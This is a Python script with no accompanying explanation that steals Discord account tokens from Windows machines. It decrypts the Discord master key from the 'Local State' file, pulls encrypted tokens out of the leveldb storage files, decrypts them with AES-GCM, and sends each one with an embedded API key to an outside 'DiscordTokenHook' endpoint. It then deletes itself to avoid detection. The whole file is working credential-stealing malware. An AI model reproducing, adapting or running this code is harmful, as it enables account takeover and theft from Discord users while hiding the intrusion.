import base64
import json
import os
import re
import sys
import requests
from Crypto.Cipher import AES
import win32crypt

API_URL = "https://api.xenithdev.com/v1/DiscordTokenHook"
API_KEY = "471b934ca6a4dd164912022e43e9ed22fcc33c6f911a9e2de195972b926cc240"


def get_master_key():
  local_state_path = os.path.join(
      os.getenv("APPDATA"), "discord", "Local State"
  )
  if not os.path.exists(local_state_path):
    return None
  try:
    with open(local_state_path, "r", encoding="utf-8") as f:
      local_state = json.load(f)
    encrypted_key = base64.b64decode(
        local_state.get("os_crypt", {}).get("encrypted_key")
    )[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
  except Exception:
    return None


def decrypt_value(buffered_ciphertext, master_key):
  try:
    if buffered_ciphertext[:3] != b"v10":
      return None
    iv = buffered_ciphertext[3:15]
    payload = buffered_ciphertext[15:-16]
    tag = buffered_ciphertext[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    return cipher.decrypt_and_verify(payload, tag).decode("utf-8")
  except Exception:
    return None


def send_token_to_api(token):
  headers = {
      "x-api-key": API_KEY,
      "Content-Type": "application/json"
  }
  payload = {
      "Token": token
  }
  try:
    response = requests.post(API_URL, headers=headers, json=payload, timeout=10)
    return response.status_code
  except Exception:
    return None


def self_delete():
  try:
    script_path = os.path.abspath(__file__)
    if os.name == "nt":
      os.system(f'start /b cmd /c "ping 127.0.0.1 -n 3 > nul & del "{script_path}""')
    else:
      os.remove(script_path)
  except Exception:
    pass


def extract_tokens(master_key):
  local_storage_path = os.path.join(
      os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"
  )
  if not os.path.exists(local_storage_path):
    return

  tokens = []
  for file_name in os.listdir(local_storage_path):
    if file_name.endswith((".ldb", ".log")):
      file_path = os.path.join(local_storage_path, file_name)
      try:
        with open(file_path, "rb") as f:
          data = f.read()
          for found in re.findall(b"dQw4w9WgXcQ:[^\"]+", data):
            try:
              encrypted_token = base64.b64decode(found.split(b":")[1])
              token = decrypt_value(encrypted_token, master_key)
              if token and token not in tokens:
                tokens.append(token)
            except Exception:
                continue
      except Exception:
        continue

  if tokens:
    for t in tokens:
      send_token_to_api(t)


if __name__ == "__main__":
  key = get_master_key()
  if key:
    extract_tokens(key)
  
  self_delete()
